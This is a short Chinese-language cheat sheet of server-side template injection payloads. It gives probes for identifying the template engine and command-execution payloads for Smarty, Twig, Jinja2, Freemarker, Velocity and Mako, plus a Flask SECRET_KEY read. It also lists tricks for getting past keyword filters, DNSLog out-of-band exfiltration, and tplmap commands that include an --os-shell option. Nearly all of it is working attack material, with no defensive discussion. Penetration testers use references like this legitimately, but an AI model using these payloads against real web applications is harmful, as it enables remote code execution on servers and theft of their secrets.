# SSTI 模板注入

## 引擎区分
```
{{7*'7'}} → 49=Jinja2, 7777777=Twig
${7*7}   → 49=Freemarker/Velocity
<%= 7*7 %> → ERB
```

## Payload

### Smarty (PHP)
```php
{$smarty.version}
{php}echo system('id');{/php}
{system('id')}
{"id"|system}
```

### Twig (PHP)
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

### Jinja2 (Python/Flask)
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ config.SECRET_KEY }}
```

### Freemarker (Java)
```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
```

### Velocity (Java)
```velocity
#set($e=$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
```

### Mako (Python)
```python
${self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}
```

## 关键字过滤绕过
```
__class__   → |attr('__class__') 或 ['__class__']
__ 被过滤   → |attr('\x5f\x5fclass\x5f\x5f')
{{ 被过滤   → {% if ... %}
. 被过滤    → |attr() 或 []
' 被过滤    → ~request.args.a~ + 参数传值
无回显      → DNSLog 带外
```

## 工具
```bash
tplmap -u 'http://target.com/page?name=*'
python2 tplmap.py -u 'http://target.com/page?name=*' --os-shell
```
